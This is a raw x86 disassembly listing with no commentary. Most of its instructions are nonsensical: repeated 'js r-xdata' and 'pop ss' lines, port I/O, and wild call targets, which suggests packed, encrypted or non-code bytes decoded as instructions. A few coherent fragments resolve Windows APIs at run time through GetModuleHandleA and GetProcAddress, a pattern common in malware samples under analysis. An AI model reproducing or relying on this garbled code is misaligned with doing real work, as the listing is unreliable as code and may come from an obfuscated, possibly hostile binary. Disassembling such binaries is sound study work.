pop ss
pop ss
js r-xdata
js r-xdata
std
js r-xdata
pop ss
sub cl 0x65
lodsb [ esi ]
int3
call 0xffffffffc6c89a00
mov fs [ ecx - 0x53 ]
sbb [ ebx + 0xaad618e ] 0xb0
or dl 0x8e
popad
cmp bl bl
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
mov eax 0x171caf00
pop ss
imul ebp [ esp ] 0x17
sub [ eax + 0x170cd601 ] ch
js r-xdata
add ah [ ebp + 0x6d ]
js r-xdata
aaa
pop ss
pop ss
js r-xdata
mov dl 0x37
adc ah 0xe2
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ebp 0x18c82da
int3
pop ss
pop ss
js r-xdata
and ah 0x47
js r-xdata
xor esp [ ebp - 0x53 ]
cmp al 0x8e
popad
popfd
arpl [ es : ebp - 0x4a9e7120 ] bx
push eax
arpl [ edx ] si
mov eax 0x618e2e63
mov ch 0x54
mov fs [ ecx - 0x43 ]
sub [ ecx ] al
pop edx
cmp edx [ edi ]
pop ss
js r-xdata
js r-xdata
out 0x5f eax
scasb [ edi ]
cld
lodsb [ gs : esi ]
fdiv st0
sub [ ecx + eax + 0x17173ed0 ] 0x78
push 0xe7e8ec97
outsb
js r-xdata
js r-xdata
adc al [ ecx ]
add [ edi ] ebx
pop ss
pop ss
js r-xdata
call 0xffffffff8f0ca391
popad
lodsd [ esi ]
js r-xdata
or al 0x17
add esi edx
js r-xdata
insd
add al bl
sbb eax 0x9011717
in eax dx
call 0xffffffff86c89887
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
add [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
mov [ edx ] al
pop ss
pop ss
adc al 0x63
lodsd [ esi ]
adc al 0xd3
lodsd [ esi ]
adc bh ah
push 0x26
sub eax 0x2d011717
arpl [ ecx + eax ] ax
or bl ch
call 0x298a20b1
pop ss
pop ss
shr [ ebp + 0x6a6ce7e4 ] cl
and eax 0xad171717

arpl [ esi - 0x1d2b7f24 ] bp
js r-xdata
imul edx [ eax ] 0xffffffe9
out 0x6d eax
adc eax 0x117172a
sbb [ edx ] ebp
pop ss
pop ss
js r-xdata
js r-xdata
sub ebx [ ecx - 0x41 ]
inc edi
js r-xdata
sub [ ecx ] al
stc
popad
movsd [ edi ] [ esi ]
js r-xdata
add al 0x69
add al 0x8c
loop r-xdata
js r-xdata
mov eax 0x1708d101
pop ss
sub [ eax + 0x17092601 ] 0x17
add eax ecx
adc al 0x17
pop ss
js r-xdata
js r-xdata
fadd [ eax - 0x4f341d2c ]
add [ esi + 0x78171710 ] ebx
js r-xdata
js r-xdata
arpl [ ebx ] bp
add [ eax + 0x78171714 ] esp
js r-xdata
arpl [ esi ] bp
mov fs [ ecx - 0x53 ]
imul eax
out 0xe8 eax
add [ 0x17173f ] edx
pop ecx
mov edi 0x1f4ae61
loopne r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] dx
add [ edi + 0x78171700 ] edx
call 0x177e78aa
pop ss
js r-xdata
js r-xdata
push esi
js r-xdata
aam 0xe2
mov ebp 0x8010463
jmp r-xdata
mov dl 0x82
lahf
mov fs [ ecx - 0x43 ]
and al 0xb2
sbb [ edx + 0x172f6401 ] 0x17
js r-xdata
pop ss
pop ss
js r-xdata
popad
scasb [ edi ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
jg r-xdata
add [ edi + 0x6b17171c ] ch
sub al 0xe4
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
insd
dec ebx
add [ 0x7817172c ] edx
js r-xdata
mov fs [ ecx - 0x53 ]
and [ edi ] dl
pop ss
js r-xdata
fldenv [ eax ]
pop ss
hlt
js r-xdata
lodsd [ esi ]
or al 0x1
push 0xffffffeb
fwait
mov fs [ ecx - 0x53 ]
or dh [ eax + 0x618eca82 ]
xchg edi eax
in al dx
call 0x5c44908c
pop ss
pop ss
imul ecx [ esp + ecx * 8 - 0x539a1734 ] 0xffffffcc
int3
and [ ebx + 0x20 ] ah
fld [ eax ]
mov fs [ ecx - 0x4b ]
pop esi
mov fs [ ecx - 0x53 ]
mov fs [ ecx - 0x5b ]
push cs
fistp [ esi ]
mov esi 0x6da4bf17
sub ah 0x65
js r-xdata
clc
fld [ eax ]
add [ ebx - 0x14 ] edi
call 0x78be9b10
out 0x6d eax
stosb [ edi ]
sub edx [ edi ]
pop ss
fld [ eax ]
add [ ebx + 0x36 ] esi
pop ss
pop ss
out 0x6c eax
pushfd
xor edx [ edi ]
clc
lodsb [ gs : esi ]
int3
add [ ebp + 0x7817175d ] eax
js r-xdata
insd
js r-xdata
mov edi 0xf0ae61
push cs
cmp [ edi ] edx
pop ss
insb
int3
scasb [ edi ]
js r-xdata
out 0x6d eax
mov fs [ ecx - 0x53 ]
sbb dh [ eax + 0x1b69b82 ]
fdivr [ esi ]
pop ss
pop ss
js r-xdata
js r-xdata
adc ebp [ ebx + 0x2e ]
loopne r-xdata
mov ebp 0x6517172a
xchg ebp eax
out 0x6d eax
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ edx ] eax
adc eax 0x2f781717
lodsd [ esi ]
adc dl cl
enter 0xcdca 0x1
mov ebx 0x7817172e
js r-xdata
pop ss
sub bh ah
insd
call 0xd8c252c
js r-xdata
pop ss
mov bh 0xb6
insd
sub [ ecx ] al
inc ebp
xor dl [ edi ]
pop ss
add [ edi - 0x24 ] 0xb8
jpo r-xdata
pop ss
pushad
mov ah 0xfd
js r-xdata
popad
push esi
cmp al 0xe8
call 0x390b2471
pop ss
pop ss
sbb [ ebx ] 0x9c
lea edi [ ebx - 0x4f519e41 ]
add bh dh
cmp [ edi ] dl
pop ss
add [ edi ] edi
sub eax 0x78781717
js r-xdata
imul ebp [ eax + edi * 8 ] 0x1
lodsb [ esi ]
adc al 0x17
pop ss
test al 0xb8
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ esi + 0xd ] eax
js r-xdata
and [ ebp + 0x65 ] ah
pop eax
adc eax 0x1a001717
push eax
pop ss
pop ss
insd
sub [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
pop ss
xchg ebp eax
mov cl 0x6d
sub [ ecx ] al
out 0x8 al
pop ss
pop ss
out 0x6c eax
or eax 0xe7171717
pop edi
stc
mov ebx 0xe8ea0301
call 0x23038397
in al 0xbb
js r-xdata
js r-xdata
lodsd [ esi ]
loopne r-xdata
sub [ edx ] 0x78781717
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
insb
int3
nop
sbb [ edi ] edx
insd
js r-xdata
movsd [ edi ] [ esi ]
in al 0x1
inc eax
inc esi
pop ss
pop ss
mov ebx 0xb401f282
add eax 0x286d1717
add [ ecx + 0x7817172a ] eax
sub dl 0x17
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ ecx ] 0xffffffea
imul ebp [ edx ] 0xffffffea
add eax esp
cmp [ edi ] edx
pop ss
js r-xdata
sub dl [ edi ]
popad
movsd [ edi ] [ esi ]
or al [ eax ]
hlt
mov eax [ 0x6d17171b ]
mov fs [ ebx - 0x55 ]
pop ss
pop ss
pop ss
mov eax 0xc6ab638e
mov esi 0x13063e4
adc [ ebx + 0x17 ] edx
pop ss
js r-xdata
pop ss
imul eax [ esp + eax * 2 ] 0xbee8e8ec
add edx ebp
das
pop ss
pop ss
mov fs [ ecx - 0x43 ]
jo r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x447e17af
call 0x2faa0dae
mov bh 0xb6
mov bl 0x6b
sub eax 0x782b219c
js r-xdata
fist [ edi ]
js r-xdata
sbb al [ edi ]
pop ss
pop ss
cmp al 0x65
pop ss
js r-xdata
popad
xchg ebp eax
jl r-xdata
out 0x5e eax
js r-xdata
mov esi 0xf4002f63
js r-xdata
pop ss
js r-xdata
mov ebp 0x173d9f01
pop ss
js r-xdata
pop ss
pop ss
mov eax 0xc8011f63
push esp
pop ss
pop ss
js r-xdata
add al 0x15
adc [ eax + 0x17058401 ] 0x17
js r-xdata
sub esp [ ecx - 0x53 ]
adc al 0xb8
pop ss
popfd
cld
arpl [ ebp + 0x192901e0 ] bp
pop ss
pop ss
js r-xdata
adc al bl
js r-xdata
js r-xdata
js r-xdata
aas
das
add ah dh
js r-xdata
adc dl [ edi ]
push ecx
fsubr st0
call 0xffffffffe9a9b24c
js r-xdata
lodsd [ esi ]
adc al 0x1
call 0x6d5e885e
js r-xdata
int3
add al 0xb9
mov ebx 0x199201be
pop ss
pop ss
js r-xdata
das
add [ ecx ] edi
push es
js r-xdata
call 0xffffffffaa470e73
js r-xdata
js r-xdata
hlt
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pushad
loopne r-xdata
push ds
arpl [ eax ] bx
sub [ ecx ] al
cmp eax [ ecx ]
pop ss
pop ss
js r-xdata
add [ ecx + 0x6d17171b ] ah
sub al 0x17
js r-xdata
pop ss
pop ss
js r-xdata
cmp [ esi ] eax
insd
add [ edi + edx ] dl
pop ss
mov eax 0x15046d65
arpl [ eax ] dx
add [ ecx + 0x6b171738 ] dh
sub al 0xf8
add [ esp + edx - 0x4757e8e9 ] ebp
imul ebp [ eax + edx * 8 ] 0x65
js r-xdata
pop ss
mov eax 0x11cad65
call 0x17a4cf8d
js r-xdata
mov gs bx
lodsb [ esi ]
or al 0x8e
popad
lodsd [ esi ]
push cs
add [ ebx ] esi
sub eax 0xac631717
int3
pop ss
pop ss
mov cl 0xb1
add ebx esp
sbb al 0x17
pop ss
js r-xdata
mov ebx 0x184700b8
pop ss
pop ss
imul ebp [ esp ] 0xffffffbb
int 0x59
js r-xdata
arpl [ ebx ] dx
mov fs [ ecx - 0x6b ]
sub [ ebx + 0x11 ] ah
mov fs [ ecx - 0x6b ]
sub al [ ecx ]
stosb [ edi ]
pop esi
pop ss
pop ss
js r-xdata
js r-xdata
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
test al 0xe4
lodsd [ esi ]
adc al 0x1
jb r-xdata
lodsd [ esi ]
pop eax
add [ ecx ] esi
or al 0x17
pop ss
js r-xdata
insd
call 0x18aa0d5d
jle r-xdata
pop ss
js r-xdata
pop es
pop ss
pop ss
fld [ eax ]
stc
out 0x5e eax
in al dx
out 0x1 al
sub esp [ edi ]
pop ss
pop ss
add [ esi + 0x6517175c ] ah
mov ebp 0x38f80034
pop ss
cmp [ eax - 0x4793529b ] bh
shl [ ebp - 0x53 ] 0x1
js r-xdata
pop esi
stosb [ edi ]
out 0x6c eax
pop ss
sub cl [ esi - 0x4f09529f ]
add dh 0xb6
or [ ebp - 0x37529e72 ] 0x1
stosb [ edi ]
pop ecx
mov esi 0x1c882be
sub [ edi ] edx
add eax ecx
or edx [ edi ]
pop ss
add [ edi + 0x6d171725 ] al
sub bh ah
insb
jl r-xdata
and [ ebx ] ebp
js r-xdata
pop ss
movsd [ edi ] gs : [ esi ]
js r-xdata
add [ eax + edx * 2 + 0x27c31717 ] eax
mov ss bx
sbb esp edi
insd
cmp ebx [ edx ]
pop ss
pop ss
add [ esi ] ecx
xor al 0x17
pop ss
js r-xdata
sbb [ ecx ] 0xf5
sub [ eax - 0x17d3a0e9 ] 0xaa00e8e8
js r-xdata
pop ss
pop ss
out 0x6c eax
leave
das
pop ss
pop ss
arpl [ ebp - 0x440f9e08 ] bp
push 0x63e8e8e8
sbb [ ebp + 0x1e ] ch
js r-xdata
js r-xdata
adc [ eax + 0x1ea5618e ] 0x63
and [ esi - 0x4eef5a9f ] cl
mov fs [ ecx - 0x5b ]
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + edi + 0x78781717 ] ebx
js r-xdata
call 0x1768cb85
js r-xdata
inc eax
add [ ebp + 0x286d1717 ] dh
out 0x6c eax
imul eax [ edi ] 0x28db1717
pop ss
push eax
movsd [ edi ] [ esi ]
js r-xdata
popad
lodsd [ esi ]
lodsd [ esi ]
loopne r-xdata
pop ss
call 0x5ef02674
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
mov ss [ eax - 0x17 ]
call 0x179e36ef
pop ss
js r-xdata
mov fs [ ecx - 0x5b ]
push ds
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
adc [ ecx + 0x12a5618e ] dh
add ebp ecx
pop ecx
mov ebx 0xe8447e17
call 0x5446284c
pop ss
pop ss
js r-xdata
mov eax 0xb86cad65
js r-xdata
pop ss
add [ edx ] ebx
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
stc
js r-xdata
add [ eax - 0x746f6fad ] dl
rol [ ebp - 0x46ef892e ] 0x1
add [ eax ] eax
js r-xdata
add [ ebx + 0x6a ] dl
add [ edx ] ch
js r-xdata
pop ss
movsb [ edi ] [ esi ]
and dl [ edi ]
js r-xdata
lodsd [ gs : esi ]
js r-xdata
pop ss
lodsd [ gs : esi ]
pop ss
mov eax 0xe817ad2e
add [ ecx + 0x31 ] al
pop ss
pop ss
add [ edi + 0x78171740 ] ebp
js r-xdata
add al bh
js r-xdata
daa
pop ss
xor esp [ edi ]
cmc
add [ edi ] dl
pop ss
js r-xdata
add [ edx - 0x47e8e8a2 ] ch
lodsd [ gs : esi ]
sbb al 0x1
js r-xdata
add [ eax ] al
pop ebp
cmp [ 0xffffffffbf171717 ] dl
js r-xdata
js r-xdata
adc al [ ecx ]
lodsd [ esi ]
js r-xdata
xor [ eax + 0x17553a01 ] dh
pop ss
mov bl 0x21
sub edi [ eax + 0x78 ]
js r-xdata
mov ebp 0x4690463
mov eax 0xbfe8e8ea
sbb [ ebx + 0x638982b1 ] 0x29
js r-xdata
jne r-xdata
pop ecx
pop ecx
pop ebp
retn 0x4
mov ebx ecx
xor eax eax
pop ebx
retn
sub al 0xfc
insd
mov edi 0x18b561
inc edi
das
pop ss
pop ss
add [ edx ] edi
pop ss
pop ss
js r-xdata
nop
dec ebx
jne r-xdata
mov eax 0x1ebc3a75
call GetAncestor
mov ebx 0x946aa26
push 0x0
push 0x0
pop ss
js r-xdata
pop ss
jg r-xdata
cmp [ edi ] dl
js r-xdata
arpl [ ebp + 0x782b2114 ] bp
adc esp [ eax ]
pop ss
pop ss
mov ebp 0x39db0034
pop ss
pop ss
add [ 0x7817175b ] eax
js r-xdata
insb
js r-xdata
clc
add [ 0x7817170c ] edx
js r-xdata
adc eax 0xbf171717
js r-xdata
js r-xdata
mov eax 0xc882bebe
add [ esi ] edi
sub [ edi ] edx
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
push cs
pop ecx
pop ss
pop ss
js r-xdata
push 0x0
push 0x0
call GetAncestor
dec ebx
jne r-xdata
mov esp 0x8bd2331e
retn
js r-xdata
js r-xdata
add ebx eax
js r-xdata
mov [ rw-data ] 0xde09
nop
nop
mov ecx 0x1ebc3a75
xor edx edx
mov eax ebx
call sub_4627e0
push 0x0
nop
js r-xdata
js r-xdata
call 0x2cb20efb
test al 0x17
pop edi
sub al 0xe8
pop ss
mov eax 0x17443200
pop ss
add [ esi + edx * 2 + 0x618e1717 ] edx
lodsd [ esi ]
xor al 0xb0
add [ edi + 0x1720d901 ] 0x17
js r-xdata
insd
sub al 0x14
pop ss
pop ss
mov eax 0x12546d65
pop ss
nop
pop ebx
retn
cmp bh [ esi + ebx - 0x6016018 ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl cx bp
arpl [ ecx + ebp * 2 ] ax
add al 0xb8
0x82bfe8e8 0xb19b
mov fs [ ecx - 0x53 ]
mov cl 0x82
mov [ ebx + 0x29 ] esp
mov fs [ ecx - 0x4b ]
or [ ecx ] al
test [ eax + 0x17 ] dl
pop ss
retn
push 0x0
call sub_45cdd8
nop
pop ebx
retn
js r-xdata
imul edx [ ecx ] 0xffffffb4
js r-xdata
mov [ ebx ] 0x9a
inc ecx
dec edx
jne r-xdata
js r-xdata
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
push ds
js r-xdata
cld
js r-xdata
mov edi 0xc1501f8
pop ss
pop ss
js r-xdata
js r-xdata
add cl cl
push es
pop ss
pop ss
mov esi 0x17556d01
pop ss
js r-xdata
js r-xdata
sub al 0xd8
js r-xdata
pop ss
mov ah 0x1
js r-xdata
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
enter 0xaa01 0x59
in al dx
jmp 0xffffffffa448106a
lahf
js r-xdata
jne r-xdata
js r-xdata
sub [ ecx ] al
xchg edi eax
test [ eax + 0x17 ] dl
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
pop es
pop ss
js r-xdata
xor [ eax + 0x17 ] ebx
js r-xdata
xor [ esi + 0x63bcb561 ] cl
xor [ esi + 0x63beb561 ] ecx
xor [ esi - 0x244f4a9f ] cl
xor eax [ ecx ]
int1
js r-xdata
dec [ ebx + 0x75db85d8 ]
add al 0x90
stc
[ eax - 0x78 ]
mov esp 0xfe9fe81e
js r-xdata
pop ss
js r-xdata
js r-xdata
push 0x0
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call GetAncestor
mov eax ebx
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov ebx 0xb85b
js r-xdata
call 0xffffffffea2ea825
call 0x182eaa2a
cmp esp [ ebx + 0x18 ]
pop ss
add [ ecx ] edx
cmp [ edi ] dl
pop ss
js r-xdata
insb
aas
add [ edi ] dl
js r-xdata
mov gs [ ebx + 0x11 ]
js r-xdata
js r-xdata
cmp al 0xfa
js r-xdata
adc [ ecx + eax + 0x171726f1 ] esi
js r-xdata
js r-xdata
dec [ ebx - 0x174173d ]
js r-xdata
add ecx esi
js r-xdata
add dh 0x8e
popad
lodsd [ esi ]
cli
mov al 0x82
sahf
mov fs [ ecx - 0x53 ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
add esi ecx
sbb eax 0x82781717
nop
retn
js r-xdata
js r-xdata
mov edi esi
js r-xdata
add [ ebp + 0x78171722 ] eax
js r-xdata
call 0xffffffff812f1013
call 0xffffffff832f1029
call 0x18a9625c
sub_460178
pop ss
adc [ gs : 0xffffffffa9011717 ] dl
adc al 0x17
pop ss
js r-xdata
mov esi 0xe8c9bc01
call 0xfffffffffa0d6fef
call 0x10f367f5
mov eax 0x13002e63
in al dx
js r-xdata
js r-xdata
js r-xdata
leave
popad
mov ebp 0x8e39630c
popad
mov ebp 0x8e386350
popad
mov ebp 0x153b0152
pop ss
pop ss
out dx al
mov ebp 0x170dd201
pop ss
js r-xdata
add [ gs : edi ] dl
mov ch 0x20
mov edi 0xe8cc1801
call 0x37ff03a6
pop ss
jns r-xdata
stc
call 0x78be7b06
js r-xdata
add esi edi
js r-xdata
pop ss
add dh 0x8e
popad
lodsd [ esi ]
or [ ecx ] al
sti
cmp edx [ edi ]
pop ss
js r-xdata
nop
adc bh [ eax ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ edi + 0x78782b21 ] dh
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
insd
sub [ ecx ] al
sub ecx ebp
call 0x58f369ae
mov eax 0x171b6b01
pop ss
out 0x6c eax
js r-xdata
js r-xdata
imul eax [ eax + ecx * 8 ] 0xffffffbb
mov esi 0x36e900bf
pop ss
js r-xdata
pop ss
js r-xdata
insd
sub [ ecx ] al
push ebx
std
call 0x78be7c0b
mov esi 0xe8ee1601
call 0xfffffffffc726e91
outsb
push esp
js r-xdata
js r-xdata
ja r-xdata
js r-xdata
call 0x78be7a97
js r-xdata
js r-xdata
lodsb [ gs : esi ]
js r-xdata
pop ss
arpl [ eax ] si
mov cl 0xb1
popad
mov ch 0x14
insd
xor esp edi
insb
movsd [ edi ] [ esi ]
aas
pop ss
pop ss
sub ah 0x1
add cl dh
js r-xdata
pop ss
arpl [ eax ] dx
insd
pop ss
out 0x6c eax
enter 0xbebb 0xbf
add cl ch
das
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0xffffffffa847eb9b
or dl [ edi ]
js r-xdata
out 0x6d eax
adc [ edx ] al
pop ss
pop ss
add [ edx + eax ] eax
pop ss
pop ss
js r-xdata
js r-xdata
call 0x78be7aa6
js r-xdata
js r-xdata
js r-xdata
popad
insd
xchg esp eax
int3
js r-xdata
mov dh 0xb3
add [ ebx ] ebx
test eax 0x19f00116
pop ss
js r-xdata
sbb [ edi ] dl
js r-xdata
js r-xdata
insb
in al dx
js r-xdata
add edx edx
or eax 0x1781717
aas
mov cl 0x6d
sub bh ah
insb
shl [ ecx ] 0x17
pop ss
add [ edi - 0x34 ] esi
js r-xdata
add [ ecx + ecx * 8 + 0x6de7e8e8 ] edi
mov fs [ ecx - 0x43 ]
or al 0x63
cmp [ esi + 0x6350bd61 ] ecx
cmp [ esi + 0x152bd61 ] cl
cmp edx [ 0x78781717 ]
js r-xdata
js r-xdata
imul ebp [ eax ] 0xffffffea
mov gs [ ebx - 0x30 ]
call 0xfffffffff2106f35
call 0x1a3d033b
pop ss
pop ss
js r-xdata
push edi
adc dl [ edi ]
js r-xdata
inc esi
xor eax 0x78781717
js r-xdata
loopne r-xdata
add al 0x1
js r-xdata
push 0xb7e8e8cb
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
popfd
imul eax
call 0xffffffffca4c04e4
call 0xffffffffe76e7128
insd
xor dl [ gs : edi ]
pop ss
pop ss
popfd
mov fs [ ecx - 0x43 ]
sub [ edx + 0x618e9082 ] dh
mov ebp 0x4001b22a
push es
pop ss
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
call 0xffffffffb9477b15
aaa
call 0xfe7abd
xchg esi eax
call 0xffffffff9da9c004
loopne r-xdata
in al 0xe7
outsb
adc cl cl
pop ss
add [ esi ] ch
add eax 0x2c6b1717
in al 0x6d
sub bh ah
insb
bound ebx [ ecx ]
pop ss
pop ss
arpl [ esi - 0x529e4748 ] bp
adc [ ebp - 0x53 ] ah
sbb al 0x1
inc ebp
0xb400e8e8 0x170d
add edi esi
sbb [ edi ] edx
imul edx ecx 0xffffffe8
add [ ecx ] esi
add [ edi ] edx
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov bh 0xb6
mov bl 0x2b
js r-xdata
movsd [ edi ] [ esi ]
adc al 0x1
cmp ecx [ ebx ]
pop ss
pop ss
js r-xdata
pop ss
add [ eax ] esi
and dl [ edi ]
pop ss
js r-xdata
pop ss
mov eax 0xe8f8a500
call 0xffffffffbf2a30e9
add [ ebp - 0x4ee8e8c1 ] ch
insd
sub edi [ eax + 0x78 ]
js r-xdata
pop ss
js r-xdata
sbb al 0x17
pop ss
js r-xdata
and bl [ edi + edx ]
add [ esi + 0x1bea3a5 ] bh
js r-xdata
in al 0x63
js r-xdata
call 0xfffffffffe47b400
adc ebp esp
mov esi 0x17164301
add ebx ebx
pop ss
pop ss
js r-xdata
add [ esi + 0x6be8e8fa ] dl
sub al 0xf0
js r-xdata
pop ss
js r-xdata
call 0xaee049c
pop ss
mov gs [ ebp + 0x1e ]
add [ edx ] ebx
loopne r-xdata
arpl [ edi ] di
js r-xdata
clc
js r-xdata
js r-xdata
cld
add [ ebx + 0x78171731 ] edi
js r-xdata
pop ss
js r-xdata
js r-xdata
sbb ah bh
call 0x78be7d43
arpl [ ebp + 0x1c2201e0 ] sp
pop ss
add edi esp
js r-xdata
mov al 0x1
jns r-xdata
insd
pushfd
adc edx [ edi ]
pop ss
mov eax 0xb8bf17be
mov bh 0xb6
and [ ebx ] ebp
js r-xdata
mov bh 0x21
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x2cb17c00
cld
movsd [ edi ] [ esi ]
mov [ 0xffffffffee1601be ] eax
js r-xdata
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
cli
call 0xfffffffff0726e34
js r-xdata
pop ss
js r-xdata
mov gs [ ebx - 0x2f ]
call 0x174732ca
xlat
js r-xdata
js r-xdata
pop ss
out 0x6d eax
jecxz r-xdata
out 0x6d eax
arpl [ edx ] si
mov fs [ ecx - 0x4b ]
dec eax
mov ebx 0x78171731
js r-xdata
pop ss
add esi ebp
cmp [ edi ] dl
js r-xdata
sbb al 0x22
pop ss
pop ss
mov cl 0x1
call 0x78be7d52
and [ 0x18deaf9 ] 0x82
js r-xdata
fdivr st3
js r-xdata
push ds
or [ edi - 0x529e714e ] 0x86
mov fs [ ecx - 0x43 ]
mov fs [ ebx + 0x38 ]
pop ss
js r-xdata
xor [ edi ] edx
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
cwde
lodsd [ gs : esi ]
arpl [ eax ] di
js r-xdata
js r-xdata
or [ ecx ] ebx
pop ss
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
popfd
call 0x2362eb8
mov edi 0x1e49d17
fsincos
call 0x78be7ac4
js r-xdata
call 0xffffffffccf2653e
enter 0x286d 0xe7
js r-xdata
js r-xdata
pop ss
fld [ eax ]
add eax ebx
or dl [ edi ]
pop ss
js r-xdata
pop ss
js r-xdata
out 0x6c eax
or [ ecx ] al
pop ss
pop ss
sub al 0x80
sbb ebp esi
sub [ eax - 0x17d3a1e9 ] 0x1663e8e8
add [ edx ] edx
and eax 0x78781717
pop ss
pop ss
js r-xdata
popad
lodsd [ esi ]
adc [ ecx ] al
mov ecx 0x78171723
out 0x61 eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
out 0x6c eax
pop edx
adc [ edi ] dl
pop ss
out 0x5f eax
mul [ ebx + 0x1a ]
add [ ebx + 0x63e8e8f6 ] eax
xor al [ edx - 0x4a9e7175 ]
mov al [ 0xffffffffb5618eb3 ]
mov [ 0xffffffffe8e19901 ] al
call 0x66b2ee64
call 0xffffffffe8aa08da
call 0xffffffffb8be7fa5
mov ebx 0xff301bb
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
fld [ eax ]
test cl dh
call 0x6d2d7e08
fsubr st0
call 0xffffffffe9a991b9
call 0xffffffffccda710f
int3
int1
js r-xdata
push ss
push ss
pop ss
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
js r-xdata
call 0x1919b5e5
out 0x6a eax
call 0xffffffffe92e6af4
call 0xfffffffffd7776df
js r-xdata
fucomi st6
arpl [ eax ] sp
insd
pop ss
js r-xdata
cmp dl [ edi ]
pop ss
pop ss
js r-xdata
out 0x6c eax
mov bl 0x82
mov ecx [ esi + 0x6336b561 ]
xor cl [ esi - 0x7db74a9f ]
fwait
arpl [ ecx ] si
add [ eax + 0x78171731 ] ebx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0x4a9c30e
mov ecx 0xe914ad2f
mov eax [ 0xffffffffd1171711 ]
xchg ebp eax
adc [ ecx ] al
out dx eax
loop r-xdata
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
js r-xdata
retn
js r-xdata
cmp [ edi ] dl
pop ss
out 0x6c eax
in eax 0xef
call 0xffffffff813288ea
call 0x22eeedf
[ edi ] edx
pop ss
js r-xdata
out dx al
xor al [ ecx ]
add esi esi
call 0x78be7f3a
js r-xdata
or [ ebx + 0x36b5618e ] 0x63
js r-xdata
cmp [ edi ] edx
pop ss
js r-xdata
pop ss
call 0xffffffffcd129993
call 0xfffffffff1cf7214
call 0xffffffffaba4ed1a
sar [ eax - 0x954a119 ] 0x1
mov eax 0x17354601
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
0xe8e8
pop ss
arpl [ ebx + ebp * 2 ] ax
add al 0xc8
mov ebx 0xe900bfbe
int3
add [ 0x6be8e8f9 ] cl
js r-xdata
call 0x702defde
xor ebp edi
js r-xdata
inc esp
cmp al 0x17
js r-xdata
enter 0x618e 0xad
add dh [ eax - 0x39fe327e ]
in eax 0x38
pop ss
insd
js r-xdata
call 0xffffffffd8c8ee88
add esi ebp
sbb eax 0x618e1717
lodsd [ esi ]
add [ eax + 0x173c7901 ] dh
pop ss
pop ss
rcl [ ebp - 0x1d10fef0 ] 0x1
call 0x64037e7d
add al 0xb9
js r-xdata
js r-xdata
and eax 0x18deaf9
xor al 0xe8
call 0x21b37d60
out 0x6c eax
js r-xdata
call 0x78be8037
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
push eax
sbb al 0x17
pop ss
mov ebx 0x81f51980
test al 0x1
out 0x1e eax
js r-xdata
xchg esp eax
int3
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ edx + 0x78e8e8e4 ] ecx
js r-xdata
add [ ecx ] edx
stc
js r-xdata
call 0x31b5eedf
std
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub bh ah
insb
pop ss
mov fs [ ecx - 0x5b ]
test bl bl
xor eax [ eax ]
mov bl 0xe8
call 0xfffffffff42208a0
sbb [ ebx - 0x67fece9d ] 0x31
pop ss
popad
mov ch 0x48
imul ebp [ esp ] 0xffffff82
clc
lodsd [ gs : esi ]
xor al 0xbb
mov eax 0x17397201
add esp ebp
loopne r-xdata
pop ss
pushfd
0xf082018d 0xe8e8
js r-xdata
js r-xdata
js r-xdata
js r-xdata
test al 0x1
rcl [ esi ] 0x17
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ edi + 0x78782b21 ] dh
int3
lodsb [ esi ]
js r-xdata
js r-xdata
js r-xdata
out 0x5f eax
stc
imul ebp [ ecx ] 0xffffffea
add esp edi
0xffffffffbf4a67f0
sub ah 0x1
push cs
sbb [ edi ] dl
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0xfffffffffbee055c
